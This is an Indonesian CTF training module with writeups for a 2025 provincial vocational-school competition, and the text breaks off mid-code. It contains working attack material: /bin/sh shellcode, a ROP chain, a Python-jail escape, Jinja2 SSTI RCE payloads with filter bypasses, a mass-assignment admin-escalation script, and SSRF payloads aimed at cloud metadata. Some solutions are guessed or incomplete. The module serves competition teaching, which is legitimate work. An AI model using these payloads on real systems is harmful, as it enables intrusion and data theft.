# Modul Ajar: Keamanan Siber (CTF)
## LKS SMK Provinsi Jawa Tengah 2025

---

**Nama Mata Lomba**: IT Network Systems Administration / Cybersecurity (CTF)  
**Jenjang**: SMK Kelas XI – XII  
**Bidang Keahlian**: Teknologi Informasi dan Komunikasi  
**Sumber Soal**: [LKS-ID/2025-LKSP-Jawa-Tengah-Public](https://github.com/LKS-ID/2025-LKSP-Jawa-Tengah-Public)  
**Tahun Penyelenggaraan**: 2025 (LKS SMK XXXIII Tingkat Provinsi Jawa Tengah)  
**Format Kompetisi**: Capture The Flag (CTF) — Jeopardy Style  
**Tanggal Pelaksanaan**: 23–25 April 2025

---

## Deskripsi Modul

Modul ini disusun sebagai panduan belajar dan referensi pengajar untuk mempersiapkan peserta didik menghadapi soal-soal keamanan siber (Cybersecurity CTF) pada Lomba Kompetensi Siswa (LKS) SMK Tingkat Provinsi Jawa Tengah Tahun 2025. Setiap kategori soal dibahas secara mendalam mulai dari konsep dasar, teknik serangan yang digunakan, analisis kode sumber soal, hingga strategi penyelesaian (writeup) dan kode solusi.

---

## Peta Kompetensi dan Kategori Soal

Repository ini mencakup **7 kategori** soal CTF dengan total **16 soal** (challenges):

| No | Kategori | Jumlah Soal | Keterampilan Utama |
|----|----------|-------------|-------------------|
| 1 | Binary Exploitation | 3 (BB1, BB2, BB3) | Shellcode, Buffer Overflow, Pwn |
| 2 | Cryptography | 3 (absolute-cinema, heavydirtysoul, lets-go-gambling) | Matematika, XOR, PRNG |
| 3 | Forensic | 3 (Armageddon, Nightmare, Zenith) | Analisis File, Log, Steganografi |
| 4 | Miscellaneous | 2 (kaburaja, tiga-serangkai) | Python Jail, OSINT |
| 5 | Reverse Engineering | 3 (Gambit, Strings, Strings Revenge) | Disassembly, Analisis Biner |
| 6 | Web Exploitation | 3 (HEHESS, MASS, SURFING) | SSTI, Mass Assignment |
| 7 | Boot2Root | 1 (shellrunner) | Assembly x86-64, Shellcoding |

---

## Prasyarat Pengetahuan Peserta

Sebelum mempelajari modul ini, peserta diharapkan telah memiliki pemahaman tentang:

- Sistem operasi Linux (dasar command line)
- Bahasa pemrograman Python (tingkat menengah)
- Konsep jaringan komputer dan protokol HTTP
- Pemrograman C dasar
- Sistem bilangan biner, heksadesimal, dan oktal

---

## Alat dan Lingkungan Belajar

Seluruh soal dapat dikerjakan menggunakan lingkungan Linux (Ubuntu/Kali Linux) dengan tools berikut:

| Tool | Fungsi | Kategori |
|------|--------|----------|
| `pwntools` | Framework exploit binary | Binary Exploitation, Boot2Root |
| `GDB + pwndbg` | Debugger biner | Binary Exploitation, Rev Eng |
| `Ghidra / IDA Free` | Decompiler / disassembler | Reverse Engineering |
| `Python 3` + `gmpy2` | Kriptografi, scripting | Cryptography, Misc |
| `randcrack` | Crack Mersenne Twister PRNG | Cryptography |
| `Burp Suite` | Intercept/manipulasi HTTP | Web Exploitation |
| `Wireshark / tshark` | Analisis paket jaringan | Forensic |
| `strings`, `file`, `binwalk` | Analisis biner awal | Forensic, Reverse Engineering |
| `nmap`, `netcat` | Recon jaringan | Boot2Root |

---

---

# BAB 1: BINARY EXPLOITATION

## 1.1 Konsep Dasar

Binary Exploitation (Pwn) adalah teknik memanfaatkan kelemahan pada program biner (compiled) yang berjalan di sistem. Pada kategori ini, peserta diberikan program executable (biasanya ELF Linux) dan server yang menjalankannya, kemudian harus menemukan celah untuk mendapatkan shell atau membaca file flag.

### Konsep-konsep Kunci

**1. Memory Layout Proses Linux**

Setiap proses Linux memiliki layout memori sebagai berikut (dari alamat rendah ke tinggi):

```
+------------------+  <- Alamat tinggi (0xFFFFFFFF)
|      Stack       |  <- Variabel lokal, return address, frame pointer
|        ↓         |
|  (tidak terpakai)|
|        ↑         |
|       Heap       |  <- Memori dinamis (malloc/free)
|      BSS         |  <- Variabel global tidak diinisialisasi
|      Data        |  <- Variabel global diinisialisasi
|      Text        |  <- Kode program
+------------------+  <- Alamat rendah (0x00000000)
```

**2. Stack Buffer Overflow**

Terjadi ketika program menulis data melebihi batas buffer yang dialokasikan di stack, sehingga dapat menimpa return address dan mengalihkan eksekusi program.

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer);  // BERBAHAYA: tidak memeriksa panjang input
    // Jika input > 64 byte, return address bisa ditimpa
}
```

**3. Shellcode**

Shellcode adalah urutan byte yang bila dieksekusi sebagai kode mesin, menjalankan perintah tertentu (biasanya `/bin/sh`). Pada soal BB1-BB3, shellcode dikirim sebagai input ke program.

**4. NX Bit & ASLR**

- **NX (No-Execute) Bit**: Mencegah eksekusi kode di area data/stack
- **ASLR (Address Space Layout Randomization)**: Mengacak alamat memori setiap kali program dijalankan
- **PIE (Position Independent Executable)**: Membuat program bisa dimuat di alamat berapa saja

---

## 1.2 Soal BB1 – Shellcode Dasar

### Analisis Soal

Soal ini memberikan program ELF 64-bit yang meminta input berupa shellcode, kemudian mengeksekusinya. Proteksi NX dinonaktifkan sehingga stack dapat dieksekusi.

**File**: `Binary Exploitation/BB1/chall.zip`

### Teknik: Classic Shellcode Injection

**Langkah-langkah:**

1. **Periksa proteksi biner:**
```bash
checksec --file=chall
# Cari: NX disabled, Stack smashing protector disabled
```

2. **Analisis program dengan GDB:**
```bash
gdb ./chall
(gdb) disassemble main
(gdb) info functions
```

3. **Buat shellcode dan exploit:**

```python
#!/usr/bin/env python3
from pwn import *

# Setup konteks
context.arch = 'amd64'
context.os = 'linux'

# Shellcode untuk execve("/bin/sh", NULL, NULL)
shellcode = asm('''
    mov rax, 59          ; syscall number execve
    lea rdi, [rip+binsh] ; pointer ke string "/bin/sh"
    xor rsi, rsi         ; argv = NULL
    xor rdx, rdx         ; envp = NULL
    syscall
    binsh:
    .string "/bin/sh"
''')

# Koneksi ke server (atau lokal)
# p = process('./chall')         # lokal
p = remote('host', port)        # remote

p.sendline(shellcode)
p.interactive()
```

---

## 1.3 Soal BB2 – Shellcode dengan Batasan Karakter

### Konsep: Alphanumeric / Restricted Shellcode

Pada soal ini program memfilter karakter tertentu dari input, sehingga shellcode harus menggunakan teknik encoding agar hanya mengandung karakter yang diizinkan.

**Teknik Bypass:**

```python
from pwn import *

context.arch = 'amd64'

# Buat shellcode yang hanya menggunakan byte tertentu
# Atau gunakan XOR encoder
raw_shellcode = asm(shellcraft.sh())
encoded = xor(raw_shellcode, 0x41)  # encode dengan key 0x41

# Decoder stub: decode shellcode di memori sebelum dijalankan
decoder = asm(f'''
    push rbp
    mov rbp, rsp
    lea rdi, [rip+payload]
    mov rcx, {len(raw_shellcode)}
decode_loop:
    xor byte ptr [rdi], 0x41
    inc rdi
    loop decode_loop
    lea rax, [rip+payload]
    call rax
payload:
''')

final_payload = decoder + encoded
```

---

## 1.4 Soal BB3 – Return-Oriented Programming (ROP)

### Konsep: ROP Chain

Ketika NX diaktifkan (stack tidak executable), teknik ROP digunakan untuk merantaikan "gadget" (potongan kode yang diakhiri `ret`) yang sudah ada di program untuk mencapai tujuan.

```python
from pwn import *
from ropper import RopChain  # atau gunakan ROPgadget

elf = ELF('./chall')
rop = ROP(elf)

# Cari gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]  # alignment stack untuk Ubuntu

# Bangun ROP chain untuk system("/bin/sh")
binsh = next(elf.search(b'/bin/sh'))
system = elf.sym['system']

payload = b'A' * offset  # padding hingga return address
payload += p64(ret_gadget)    # stack alignment
payload += p64(pop_rdi)       # gadget: pop rdi; ret
payload += p64(binsh)         # argument: "/bin/sh"
payload += p64(system)        # system()
```

---

## Latihan Mandiri – Binary Exploitation

1. Install `pwntools`: `pip install pwntools`
2. Tulis shellcode x86-64 untuk mencetak "Hello" menggunakan syscall `write`
3. Gunakan `checksec` pada binary yang diberikan dan identifikasi proteksinya
4. Buat script pwntools untuk berinteraksi dengan program yang meminta input

---

---

# BAB 2: CRYPTOGRAPHY

## 2.1 Konsep Dasar

Kriptografi dalam CTF melibatkan analisis dan pemecahan skema enkripsi yang lemah atau mengandung kerentanan logika. Berbeda dengan kriptografi yang dipecahkan secara brute force, soal CTF biasanya memiliki jalan pintas berdasarkan kelemahan implementasi.

---

## 2.2 Soal: absolute-cinema

### Analisis Kode Sumber

```python
#!/usr/bin/env python3
from gmpy2 import iroot

print("I'll judge your number")
num = int(input("Enter a number: "))

creativity = round(min(5, num/20000), 1)
balance = min(abs(len(set(str(num))) - 10), len(set(str(num))))
harmony = max(0, 5 - (num - int(iroot(num, 2)[0])**2))

if creativity == 5 and balance == 5 and harmony == 5:
    print("ABSOLUTE CINEMA")
    print(open("flag.txt", "r").read())
```

### Analisis Kondisi

Program mengevaluasi tiga kondisi pada sebuah bilangan bulat yang diinput:

**Kondisi 1 – Creativity == 5:**
```
creativity = round(min(5, num/20000), 1) == 5
→ num / 20000 >= 5
→ num >= 100000
```

**Kondisi 2 – Balance == 5:**
```
balance = min(abs(len(set(str(num))) - 10), len(set(str(num)))) == 5
→ len(set(str(num))) == 5
→ Angka harus memiliki tepat 5 digit unik
   Contoh: 12345, 100234, 112345, 9988123
```

**Kondisi 3 – Harmony == 5:**
```
harmony = max(0, 5 - (num - int(iroot(num, 2)[0])**2)) == 5
→ 5 - (num - floor(sqrt(num))^2) == 5
→ num - floor(sqrt(num))^2 == 0
→ num adalah bilangan kuadrat sempurna (perfect square)
   Contoh: 1, 4, 9, 16, 25, 100489
```

### Strategi Penyelesaian

Cari bilangan yang memenuhi ketiga syarat sekaligus:
- >= 100000
- Tepat 5 digit unik
- Bilangan kuadrat sempurna

```python
import math

def is_perfect_square(n):
    root = int(math.isqrt(n))
    return root * root == n

for n in range(100000, 10000000):
    if is_perfect_square(n) and len(set(str(n))) == 5:
        print(f"Found: {n} (sqrt={math.isqrt(n)})")
        break

# Output: 100489 (sqrt = 317)
# Digit unik: 1, 0, 4, 8, 9 → 5 digit unik ✓
# Perfect square: 317^2 = 100489 ✓
# >= 100000 ✓
```

**Jawaban: 100489**

---

## 2.3 Soal: heavydirtysoul

### Konsep: XOR Cipher dengan Key dan Message Tertukar

Soal ini memanfaatkan properti XOR yang simetris: jika `cipher = key XOR msg`, maka `key = cipher XOR msg` dan `msg = cipher XOR key`.

Kerentanan utama: **key dan msg ditukar posisinya**, sehingga kita bisa mengendalikan key.

### Properti XOR yang Penting

```
A XOR A = 0         (XOR dengan diri sendiri = 0)
A XOR 0 = A         (XOR dengan 0 = nilai asli)
A XOR B = B XOR A   (komutatif)
(A XOR B) XOR B = A (bisa balik arah)
```

### Strategi Penyelesaian

Jika program melakukan `cipher = input_kita XOR message_rahasia`:
1. Kirim key = `b'\x00' * len(ciphertext)` → akan mendapatkan pesan asli
2. Atau: Kirim key yang sama dengan ciphertext → akan mendapatkan 0

```python
from pwn import *

p = remote('host', port)

# Terima ciphertext
ciphertext = bytes.fromhex(p.recvline().decode().strip())

# Kirim key = ciphertext (XOR dengan diri sendiri = 0, lalu XOR dengan msg)
# Sebenarnya: server compute key XOR msg, dan kita kontrol 'key'
# Jadi kirim key = 0x00 * len untuk mendapatkan msg langsung
key = b'\x00' * len(ciphertext)
p.sendline(key.hex())

flag = p.recvline()
print(flag)
```

---

## 2.4 Soal: lets-go-gambling

### Konsep: Cracking Mersenne Twister PRNG

Python menggunakan algoritma **Mersenne Twister (MT19937)** sebagai PRNG default. MT19937 menghasilkan angka 32-bit, dan setelah mengumpulkan 624 output berturut-turut, state internal bisa direkonstruksi sepenuhnya — memungkinkan kita **memprediksi semua angka berikutnya**.

### Analisis Kode

```python
import random
random.seed(os.urandom(32))  # seed acak yang tidak kita ketahui

# Fitur "double spin" menghasilkan 2 angka random per spin
# Dengan double spin, kita mendapatkan 2 x 32-bit = 64-bit info per giliran
```

Program menawarkan dua mode:
- **Gamble**: Kita spin, melihat hasilnya → mengumpulkan state PRNG
- **Predict**: Kita harus tebak 10 hasil berturut-turut → dapat flag jika benar

### Strategi dengan `randcrack`

```python
from pwn import *
from randcrack import RandCrack

p = remote('host', port)

rc = RandCrack()
collected = 0

# Aktifkan double spin (setelah 10 giliran pertama)
# Kumpulkan 624 nilai 32-bit dari output MT
while collected < 624:
    p.sendline(b'1')  # pilih gamble
    output = p.recvuntil(b'1. Gamble').decode()
    # Parse simbol-simbol dari output untuk rekonstruksi nilai random
    # Setiap gamble menghasilkan 5 simbol dari 1 angka 32-bit
    # Extract angka random dari kombinasi simbol
    extracted_value = parse_symbols(output)
    rc.submit(extracted_value)
    collected += 1

# Setelah 624 nilai terkumpul, PRNG sudah bisa diprediksi
p.sendline(b'2')  # pilih predict

for _ in range(10):
    predicted = rc.predict_getrandbits(32)
    symbols = decode_symbols(predicted)
    p.sendline(' '.join(symbols).encode())

print(p.recvall())
```

### Catatan Implementasi

- Library `randcrack` (Python) menerima 624 angka 32-bit dan merekonstruksi state MT19937
- Fitur "double spin" memberikan 2 angka 32-bit per giliran, mempercepat pengumpulan data
- Install: `pip install randcrack`

---

## Latihan Mandiri – Cryptography

1. Tulis program yang memverifikasi apakah suatu bilangan memenuhi ketiga syarat soal absolute-cinema
2. Buktikan dengan kode bahwa `(A XOR B) XOR B == A` untuk nilai sembarang
3. Kumpulkan 624 output dari `random.getrandbits(32)` dan prediksi output ke-625 menggunakan `randcrack`

---

---

# BAB 3: FORENSIC

## 3.1 Konsep Dasar

Digital Forensics dalam CTF melibatkan analisis file, gambar disk, capture jaringan, log sistem, atau media lainnya untuk menemukan data tersembunyi atau informasi yang diperlukan untuk mendapatkan flag.

### Tool Forensics Utama

```bash
# Identifikasi tipe file
file suspect_file

# Ekstrak string yang dapat dibaca
strings -n 8 binary_file | grep -i flag

# Analisis metadata
exiftool image.jpg

# Cari file tersembunyi dalam file lain
binwalk -e archive.zip

# Analisis log XML
xmllint --format logs.xml | grep -i suspicious
```

---

## 3.2 Soal: Zenith (Log Analysis)

### Analisis Soal

Soal ini memberikan file `logs.xml` yang berisi log sistem. Tugas peserta adalah menganalisis log untuk menemukan flag atau aktivitas mencurigakan.

**File**: `Forensic/Zenith/logs.xml`

### Teknik Analisis Log XML

```python
import xml.etree.ElementTree as ET

tree = ET.parse('logs.xml')
root = tree.getroot()

# Cari entry yang mengandung pola flag
for element in root.iter():
    if element.text and ('flag' in element.text.lower() or 
                          'lks{' in element.text.lower() or
                          'ctf{' in element.text.lower()):
        print(element.tag, element.text)

# Tampilkan semua event dengan EventID tertentu
for event in root.findall('.//Event'):
    event_id = event.find('.//EventID')
    if event_id is not None:
        print(f"EventID: {event_id.text}")
        # Tampilkan semua data event
        for data in event.findall('.//Data'):
            if data.text:
                print(f"  {data.get('Name', '')}: {data.text}")
```

### Teknik Umum Forensics Log

```bash
# Filter berdasarkan waktu mencurigakan
grep "23:00\|00:00\|01:00\|02:00" logs.xml

# Cari Base64 encoded content
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' logs.xml | while read b64; do
    echo "$b64" | base64 -d 2>/dev/null
done

# Cari pola flag
grep -oP 'LKS\{[^}]+\}' logs.xml
```

---

## 3.3 Soal: Armageddon & Nightmare

### Teknik Umum untuk Soal Forensic Berbasis ZIP

```bash
# Ekstrak dan periksa isi zip
unzip -l chall.zip
unzip chall.zip

# Periksa file yang ter-extract
file *
strings * | grep -i flag

# Cek metadata EXIF untuk gambar
exiftool *.jpg *.png 2>/dev/null

# Cek steganografi dalam gambar
steghide extract -sf image.jpg
zsteg image.png  # untuk PNG dengan LSB stego

# Analisis dengan foremost untuk carving
foremost -i disk_image -o output_dir

# Analisis PCAP
tshark -r capture.pcap -T fields -e data.data | xxd -r -p | strings
```

---

## Latihan Mandiri – Forensic

1. Buat file gambar PNG dan sembunyikan teks menggunakan `steghide`, kemudian ekstrak kembali
2. Parse file XML log dan tampilkan semua baris yang mengandung kata "error"
3. Gunakan `binwalk` untuk menganalisis file binary dan cari embedded file di dalamnya

---

---

# BAB 4: MISCELLANEOUS

## 4.1 Soal: kaburaja (Python Jail Escape)

### Analisis Kode

```python
#!/usr/bin/env python3

code = input("No funny business: ")
if any(c in code for c in "qwertyuiopasdfghjklzxcvbnm1234567890"):
    print("Nope")
    exit(1)
else:
    eval(code)
```

### Analisis Batasan

Program memblokir **semua huruf alfabet latin (a-z) dan semua angka (0-9)**. Namun tidak memblokir:
- Karakter Unicode (emoji, karakter Cyrillic, karakter Asia, dll.)
- Simbol: `+`, `-`, `*`, `/`, `%`, `(`, `)`, `[`, `]`, `{`, `}`, `!`, `~`, `^`, `&`, `|`, `@`, `#`, `$`, `_`, `.`, `,`, `:`, `;`, `'`, `"`, `\`, `<`, `>`, `=`, `?`, ` `, newline

### Teknik Bypass: Unicode Substitution

Python mendukung identifiers Unicode. Huruf Latin dalam Unicode range lain (seperti Mathematical Bold, Fullwidth) bisa digunakan sebagai variabel tetapi BUKAN sebagai built-in.

**Teknik yang Berhasil: Konstruksi Karakter via Operasi**

```python
# Menggunakan karakter yang tidak diblokir untuk membangun ekspresi
# Contoh: mendapatkan 'os' module tanpa mengetik huruf

# Metode 1: Menggunakan __builtins__ via atribut object
# Tanpa mengetik huruf sama sekali menggunakan unicode

# Metode 2: XOR / aritmatika untuk membangun karakter
# chr(111) = 'o', chr(115) = 's', dll.
# Tapi tidak bisa pakai angka... harus konstruksi

# Metode 3: Gunakan karakter Unicode yang setara dengan Latin
# Python 3 menerima unicode identifiers
# Contoh: menggunakan Cyrillic 'а' (U+0430) sebagai identifier

# Payload contoh (menggunakan karakter non-ASCII):
# __import__("os").system("cat flag.txt")
# → ganti semua huruf dengan unicode lookalike

payload = """__𝒊𝒎𝒑𝒐𝒓𝒕__("𝒐𝒔").𝒔𝒚𝒔𝒕𝒆𝒎("𝒄𝒂𝒕 𝒇𝒍𝒂𝒈.𝒕𝒙𝒕")"""
```

**Metode Alternatif: Menggunakan operator dan built-in tersembunyi**

```python
# Konstruksi string 'os' dari karakter yang bisa dibuat
# Misalnya via chr() → tapi chr juga huruf...
# Gunakan getattr dan string kosong

# Payload yang efektif: karakter unicode untuk 'import' dan 'os'
# (karakter mathematical italic: 𝒊𝒎𝒑𝒐𝒓𝒕)
# Python eval menerima unicode identifiers sebagai nama fungsi

# Test apakah unicode diterima:
# >>> def 𝒕𝒆𝒔𝒕(): pass  # Valid Python 3!
```

---

## 4.2 Soal: tiga-serangkai (OSINT)

### Analisis Soal

Diberikan sebuah gambar (`chall.png`) yang menampilkan sebuah bangunan. Peserta harus mengidentifikasi lokasi tersebut dan mencari hotel terdekat.

**Nama lokasi**: *Rosalina Laboratorium dan Klinik*

### Teknik OSINT (Open Source Intelligence)

**1. Reverse Image Search**
```
→ Upload gambar ke Google Images / TinEye / Bing Images
→ Cari kecocokan lokasi
```

**2. Google Maps**
```
→ Cari "Rosalina Laboratorium dan Klinik" di Google Maps
→ Identifikasi area / kota
→ Cari hotel terdekat dalam radius 500m - 1km
```

**3. Analisis Metadata Gambar**
```bash
exiftool chall.png
# Cek GPS coordinates jika ada
# Cek komentar/deskripsi tersembunyi
```

**Flag**: Berdasarkan analisis, cari nama hotel terdekat dari lokasi "Rosalina Laboratorium dan Klinik" di Google Maps.

### Teknik OSINT Lainnya yang Umum di CTF

```
- Shodan: Pencarian device/server yang terhubung internet
- WHOIS: Informasi domain
- LinkedIn / Facebook: Informasi personal
- Google Dorks: Pencarian lanjutan Google
  contoh: site:example.com filetype:pdf "confidential"
- Wayback Machine: Snapshot website masa lalu
```

---

## Latihan Mandiri – Miscellaneous

1. Buat Python script yang memverifikasi apakah suatu karakter adalah alfabet Latin
2. Lakukan reverse image search pada gambar landmark lokal dan identifikasi lokasinya
3. Eksplorasi Google Dorks untuk menemukan informasi publik (etis) tentang domain tertentu

---

---

# BAB 5: REVERSE ENGINEERING

## 5.1 Konsep Dasar

Reverse Engineering (Rev) melibatkan analisis program biner tanpa kode sumber untuk memahami cara kerjanya dan menemukan flag yang tersembunyi dalam logika program.

### Alur Kerja Reverse Engineering

```
1. Identifikasi tipe file
   → file chall

2. Periksa string yang ada
   → strings chall | grep -i "flag\|lks\|ctf\|password\|key"

3. Analisis dengan disassembler
   → objdump -d chall | less
   → atau buka dengan Ghidra/IDA

4. Dynamic analysis
   → strace ./chall        # trace system calls
   → ltrace ./chall        # trace library calls
   → GDB untuk step-by-step

5. Rekonstruksi logika
   → Pahami algoritma verifikasi
   → Balikkan algoritma untuk mendapat input yang valid (flag)
```

---

## 5.2 Soal: Strings

### Teknik: Pencarian String Sederhana

Banyak tantangan rev engineering untuk pemula menyembunyikan flag langsung dalam binary sebagai string.

```bash
# Cari flag langsung
strings dist/chall | grep -E "LKS\{|CTF\{|flag\{"

# Cari semua string panjang (kemungkinan encoded)
strings -n 20 dist/chall

# Cari dengan format hex yang mungkin
xxd dist/chall | grep -i "4c4b53"  # "LKS" dalam hex
```

---

## 5.3 Soal: Strings Revenge

### Teknik: String Obfuscation

Soal lanjutan di mana string diobfuskasi — tidak bisa langsung ditemukan dengan `strings`.

**Teknik yang umum digunakan untuk menyembunyikan string:**

1. **XOR Encoding**: Setiap karakter di-XOR dengan key
2. **Caesar Cipher**: Setiap karakter digeser N posisi
3. **Base64 Encoding**: String dienkode Base64
4. **Stack Construction**: String dibangun karakter per karakter di stack
5. **Reversed String**: String disimpan terbalik

```python
# Deteksi XOR encoding dengan Ghidra/IDA
# Cari loop yang melakukan operasi XOR pada array byte

# Script Python untuk brute-force XOR key
def xor_decrypt(data, key):
    return bytes([b ^ key for b in data])

encrypted = bytes([0x4e, 0x49, 0x52, ...])  # dari analisis binary
for key in range(256):
    decrypted = xor_decrypt(encrypted, key)
    if b'LKS' in decrypted or b'flag' in decrypted.lower():
        print(f"Key: {key}, Flag: {decrypted}")
```

---

## 5.4 Soal: Gambit (Game-based Reverse Engineering)

### Teknik: Analisis Logika Game

Soal Gambit menyajikan program berbentuk game. Peserta harus:
1. Memahami kondisi kemenangan
2. Menemukan atau meng-hardcode state yang memenuhi kondisi tersebut

```python
# Dengan GDB: set breakpoint di fungsi win/flag
gdb ./chall
(gdb) break *0x400abc  # alamat fungsi verifikasi
(gdb) run
# Saat di breakpoint, manipulasi register/memori untuk bypass

# Patch binary: ubah instruksi jump conditional
# jne → je (lompat jika TIDAK sama → lompat jika sama)
# Gunakan hex editor:
python3 -c "
import struct

with open('chall', 'rb') as f:
    data = bytearray(f.read())

# Temukan offset instruksi 'jne' dan ubah ke 'je'
# jne = 0x75, je = 0x74
offset = 0x1234  # offset dari analisis Ghidra
data[offset] = 0x74  # ubah 0x75 (jne) ke 0x74 (je)

with open('chall_patched', 'wb') as f:
    f.write(data)
"
chmod +x chall_patched
./chall_patched
```

---

## Latihan Mandiri – Reverse Engineering

1. Compile program C sederhana dan analisis outputnya dengan `strings` dan `objdump`
2. Buat program yang mengenkripsi string dengan XOR, kemudian dekripsi hasilnya
3. Gunakan Ghidra (gratis) untuk membuka binary dan identifikasi fungsi `main`

---

---

# BAB 6: WEB EXPLOITATION

## 6.1 Konsep Dasar

Web Exploitation melibatkan serangan terhadap aplikasi web. Pada repository ini terdapat dua tipe utama kerentanan: **Server-Side Template Injection (SSTI)** dan **Mass Assignment Vulnerability**.

---

## 6.2 Soal: HEHESS (Server-Side Template Injection / SSTI)

### Analisis Kode Vulnerable

```python
# app.py - bagian yang vulnerable
blacklisted_chars = ['_']  # HANYA memblokir underscore!
filtered_content = note.content
for char in blacklisted_chars:
    filtered_content = filtered_content.replace(char, '')

# Kemudian langsung dimasukkan ke template:
return render_template_string(f'''
    ...
    {filtered_content}   ← INPUT PENGGUNA TANPA SANITASI MEMADAI
    ...
''')
```

### Apa itu SSTI?

SSTI terjadi ketika input pengguna dimasukkan langsung ke dalam template engine (Jinja2, Twig, Freemarker, dll.) dan dieksekusi sebagai kode template, bukan hanya teks biasa.

**Contoh serangan SSTI Jinja2:**

```
Input normal:   Hello World
Output:         Hello World

Input SSTI:     {{ 7 * 7 }}
Output:         49             ← Template dieksekusi!

Input SSTI:     {{ config }}
Output:         <Config {...}>  ← Konfigurasi server terekspos!
```

### Bypass Blacklist Underscore

Karena `_` diblokir, dan banyak payload SSTI menggunakan `__class__`, `__mro__`, dll., kita perlu menggunakan teknik bypass.

**Teknik bypass `_` dalam Jinja2:**

```jinja2
# Cara 1: Gunakan request.args untuk menyuntikkan underscore
{{ request.args.get('param') }}
→ Kirim: ?param=__class__

# Cara 2: Gunakan |attr() filter
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
→ \x5f adalah representasi hex dari _

# Cara 3: Gunakan variabel request
{{ ''[request.args.c] }}
→ dengan request.args.c = __class__

# Cara 4: Construct underscore dari chr()
{{ ''|attr((()|select()|string()|list())[24]*2+'class'+((()|select()|string()|list())[24]*2)) }}
```

### Payload SSTI untuk RCE (Remote Code Execution)

```jinja2
# Tanpa _: menggunakan request untuk inject underscore
{{request.args.c|attr(request.args.a)}}
→ ?c=__class__&a=__mro__

# Full RCE payload (URL-encoded)
{{''[request.args.c][request.args.m][2][request.args.s]('ls')[request.args.o]}}
→ request.args.c = __class__
→ request.args.m = __mro__
→ request.args.s = __subclasses__
→ request.args.o = __init__

# Payload yang sudah umum digunakan (bypass _)
{% set a = namespace() %}
{% set ns = a|string|replace('namespace','') %}
```

### Langkah Eksploitasi HEHESS

```
1. Register akun baru
2. Buat catatan baru dengan payload SSTI sebagai konten
3. Lihat catatan tersebut
4. Payload SSTI dieksekusi oleh server
5. Baca file /flag-953ccbb05a22a08e6476e1e71d6dd456.txt
```

```python
import requests

target = "http://localhost:5000"
s = requests.Session()

# Register
s.post(f"{target}/register", data={
    "username": "hacker",
    "email": "hack@test.com", 
    "password": "password123"
})

# Login
s.post(f"{target}/login", data={
    "username": "hacker",
    "password": "password123"
})

# Buat note dengan SSTI payload (bypass _ dengan request.args)
payload = "{{request|attr('application')|attr('\x5f\x5fself\x5f\x5f')}}"
s.post(f"{target}/notes/new", data={
    "title": "Test",
    "content": payload
})
```

---

## 6.3 Soal: MASS (Mass Assignment Vulnerability)

### Analisis Kode Vulnerable

```python
# Model User memiliki field 'role'
class User(db.Model):
    username = db.Column(db.String(80))
    email = db.Column(db.String(120))
    password = db.Column(db.String(120))
    role = db.Column(db.String(20), default='standard')  ← role ada di model!

# Endpoint register TIDAK memfilter field 'role':
new_user = User(
    username=username,
    email=email,
    password=hashed_password
    # role tidak di-set secara eksplisit
    # Tapi di soal MASS, mungkin ada kerentanan berbeda
)
```

### Apa itu Mass Assignment?

Mass Assignment terjadi ketika aplikasi secara otomatis memetakan parameter request HTTP ke properti objek tanpa validasi field yang diizinkan. Penyerang bisa menambahkan field `role=admin` dalam request POST.

### Eksploitasi dengan Burp Suite

```
1. Buka Burp Suite
2. Register akun baru melalui browser (dengan Burp intercept aktif)
3. Tangkap request POST /register
4. Tambahkan field role=admin ke body request:

   Original:
   username=test&email=test@test.com&password=test123

   Modified:
   username=test&email=test@test.com&password=test123&role=admin

5. Forward request yang sudah dimodifikasi
6. Login dengan akun yang sudah dibuat
7. Akses /admin/flag
```

### Eksploitasi dengan Python Requests

```python
import requests

target = "http://localhost:5000"
s = requests.Session()

# Coba daftarkan akun dengan role=admin
response = s.post(f"{target}/register", data={
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "password",
    "role": "admin"  # ← Field tambahan yang tidak seharusnya bisa diset
})

print(response.status_code)

# Login
s.post(f"{target}/login", data={
    "username": "attacker",
    "password": "password"
})

# Coba akses admin panel
r = s.get(f"{target}/admin/flag")
print(r.text)
```

---

## 6.4 Soal: SURFING

### Kemungkinan Kerentanan: Server-Side Request Forgery (SSRF)

Berdasarkan nama "SURFING" (yang merujuk pada web surfing), soal ini kemungkinan berkaitan dengan SSRF.

### Konsep SSRF

SSRF terjadi ketika server membuat permintaan HTTP ke URL yang dikontrol oleh penyerang, memungkinkan akses ke layanan internal.

```
Penyerang → Server Web → Internal Service (database, API internal, dll.)
                ↑
           URL dikontrol penyerang
```

**Payload SSRF Umum:**
```
http://localhost/flag
http://127.0.0.1/flag
http://169.254.169.254/latest/meta-data/  ← AWS metadata
http://0.0.0.0:8080/internal
```

---

## Latihan Mandiri – Web Exploitation

1. Setup Flask app sederhana yang vulnerable terhadap SSTI dan eksploitasi sendiri
2. Gunakan Burp Suite untuk mengubah request POST dan tambahkan parameter tersembunyi
3. Pelajari OWASP Top 10 dan identifikasi mana yang relevan dengan soal-soal di atas

---

---

# BAB 7: BOOT2ROOT

## 7.1 Analisis Soal: shellrunner

### Deskripsi

Soal boot2root ini menggabungkan Web Exploitation dengan Binary Exploitation. Terdapat sebuah web application berbasis Flask yang memungkinkan pengguna memasukkan kode assembly x86-64, mengompilasinya dengan pwntools, dan menjalankannya langsung di server.

### Arsitektur Soal

```
User (Browser)
    ↓ Input assembly code (POST)
Flask Web App (server.py)
    ↓ asm() → compiled hex
./main <hex_shellcode>    ← Program C yang mengeksekusi shellcode
    ↓ mmap + execute
Shellcode berjalan di server dengan hak akses server
```

### Kode C Utama (main.c)

```c
#define CODE_ADDR 0x80000000
// Shellcode dimapping ke alamat tetap: 0x80000000
// Dijalankan langsung sebagai kode native!

void *addr = mmap((void *)CODE_ADDR, PAGE_SIZE,
                  PROT_READ | PROT_WRITE | PROT_EXEC,  ← RWX!
                  MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
memcpy(addr, shellcode, code_size);
void (*func)() = (void (*)())addr;
func();  ← Eksekusi shellcode!
```

Program C ini:
1. Menerima shellcode dalam format hex sebagai argumen command line
2. Memetakan memori di alamat tetap `0x80000000` dengan permission RWX
3. Menyalin shellcode ke memori tersebut
4. Mengeksekusi shellcode

### Kode Flask (server.py)

```python
from pwnlib.asm import asm
from pwnlib.context import context
context.arch = 'amd64'

compiled_code = asm(user_input)  # Compile assembly input
result = subprocess.check_output(
